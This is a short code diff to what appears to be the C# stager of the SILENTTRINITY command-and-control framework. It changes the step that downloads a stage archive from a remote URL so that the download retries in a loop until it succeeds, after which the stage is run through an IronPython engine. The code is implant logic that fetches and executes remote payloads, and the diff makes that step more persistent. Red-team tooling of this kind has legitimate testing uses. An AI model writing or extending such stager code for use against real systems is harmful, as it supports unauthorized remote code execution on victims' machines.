@@ -34,8 +34,11 @@ namespace SILENTTRINITY
             Console.WriteLine("URL: {0}", URL);
             Console.WriteLine();
 #endif
-
-            Stage = ZipStorer.Open(Engines.IronPython.GetStage(URL), FileAccess.ReadWrite, true);
+            do
+            {
+                Stage = ZipStorer.Open(Engines.IronPython.GetStage(URL),
+                                        FileAccess.ReadWrite, true);
+            } while (Stage == null);
 
             Engines.IronPython.Run(URL, GUID, Stage);
         }
